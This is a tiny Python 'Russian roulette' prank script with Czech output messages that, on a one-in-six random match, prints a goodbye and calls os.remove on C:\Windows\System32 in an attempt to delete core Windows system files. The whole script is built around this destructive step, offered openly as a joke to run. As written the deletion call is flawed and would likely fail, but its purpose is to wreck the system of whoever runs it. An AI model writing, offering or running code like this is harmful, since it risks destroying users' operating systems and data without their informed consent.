import os
import random
live = random.randint(1, 6)
bullet = random.randint(1, 6)
if live == bullet:
    print("ŽÍVÁ! bye bye system.")
    os.remove("C:\Windows\System32")
else:
    print("Systém přežil!")